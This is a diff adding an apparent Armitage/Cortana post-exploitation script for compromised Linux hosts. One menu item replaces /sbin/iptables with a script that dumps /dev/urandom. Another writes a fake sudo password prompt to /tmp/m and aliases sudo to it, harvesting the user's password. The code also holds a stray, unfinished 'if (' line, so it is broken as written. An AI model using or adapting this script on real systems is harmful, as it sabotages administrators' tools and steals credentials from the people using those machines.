@@ -1,0 +1,24 @@
+# This is a script to move the iptables binary and replace it with an annoying script
+
+popup shell {
+	if (host_os(session_host($1)) eq "Linux") {
+		if (
+		menu "Move Binaries" {
+			item "Iptables" {
+				println("modifying the iptables binary");
+				s_cmd($1, "sudo mv /sbin/iptables /sbin/iptablesbak");
+				s_cmd($1, "echo 'cat /dev/urandom' | sudo tee -a /sbin/iptables");
+			}
+			item "Sudo" {
+				println("Modifying sudo");
+				s_cmd($1, "echo '#!/bin/bash' > /tmp/m");
+				s_cmd($1, "echo 'echo -n [sudo] password for '$USER':' >> /tmp/m");
+				s_cmd($1, "echo 'read -s spassword' >> /tmp/m");
+				s_cmd($1, "echo 'echo $spassword' >> /tmp/m");
+				s_cmd($1, "chmod +x /tmp/m");
+				s_cmd($1, "alias sudo='/tmp/m'");
+			}
+		}
+	}
+}
+		
